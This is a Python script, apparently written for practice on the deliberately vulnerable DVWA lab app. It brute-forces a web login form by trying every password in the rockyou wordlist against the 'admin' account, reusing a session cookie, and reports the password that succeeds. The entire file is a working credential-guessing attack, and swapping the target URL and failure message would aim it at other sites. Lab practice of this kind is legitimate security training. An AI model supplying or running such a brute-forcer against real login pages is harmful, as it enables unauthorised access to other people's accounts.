#!/usr/bin/env python3
"""
brute.py — a minimal HTTP login brute-forcer for the DVWA Brute Force module.

Educational tool for a personal, isolated lab. It submits the DVWA login form
repeatedly, trying each password from a wordlist against a fixed username, and
stops when the failure message no longer appears in the response.

Usage:
    python3 brute.py

Edit the CONFIG block below to match your instance (target, cookie, wordlist).
"""

import requests
import sys
import time

# ------------------------- CONFIG -------------------------
TARGET   = "http://192.168.122.1:8080/vulnerabilities/brute/"
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

# Your logged-in DVWA session. Grab PHPSESSID from the browser:
# F12 -> Storage -> Cookies. security must be "low" for this module.
COOKIES = {
    "PHPSESSID": "sesion_cookie",
    "security":  "low",
}

# DVWA shows this text on a failed login. Its ABSENCE means success.
FAILURE_STRING = "Username and/or password incorrect."

# Stop after the first hit. Set False to keep going (not useful here).
STOP_ON_SUCCESS = True
# ----------------------------------------------------------


def attempt(session, password):
    """Submit one login guess. Return True if it succeeded."""
    params = {
        "username": USERNAME,
        "password": password,
        "Login": "Login",
    }
    r = session.get(TARGET, params=params)
    # Success = the failure message is NOT in the response body.
    return FAILURE_STRING not in r.text


def main():
    session = requests.Session()
    session.cookies.update(COOKIES)

    # Fail fast if the cookie is stale — a logged-out session would make
    # every attempt look like a failure and we'd never get a hit.
    check = session.get(TARGET)
    if "login.php" in check.url or check.status_code != 200:
        print("[!] Session check failed — is PHPSESSID current and are you "
              "logged in? Re-grab the cookie from the browser.")
        sys.exit(1)

    print(f"[*] Target   : {TARGET}")
    print(f"[*] Username : {USERNAME}")
    print(f"[*] Wordlist : {WORDLIST}")
    print(f"[*] Started  : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 50)

    tried = 0
    start = time.time()

    # rockyou has non-UTF8 bytes; errors='ignore' skips them cleanly.
    with open(WORDLIST, "r", encoding="latin-1") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue

            tried += 1
            if tried % 50 == 0:
                print(f"[.] {tried} tried — current: {password}")

            if attempt(session, password):
                elapsed = time.time() - start
                print("-" * 50)
                print(f"[+] SUCCESS  login: {USERNAME}  password: {password}")
                print(f"[+] Found after {tried} attempts in {elapsed:.1f}s")
                if STOP_ON_SUCCESS:
                    return

    print("[-] Exhausted wordlist, no valid password found.")


if __name__ == "__main__":
    main()